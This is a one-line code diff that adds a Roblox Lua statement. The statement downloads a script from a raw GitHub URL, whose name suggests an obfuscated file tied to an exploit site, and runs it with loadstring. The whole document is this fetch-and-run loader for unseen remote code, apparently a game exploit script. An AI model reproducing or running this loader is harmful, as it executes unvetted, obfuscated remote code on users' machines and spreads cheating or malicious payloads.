@@ -1,0 +1,1 @@
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/mreggg62-a11y/yesyesyess/refs/heads/main/--%5B%5B%20v1.0.0%20httpswearedevs.netobfus.txt", true))()
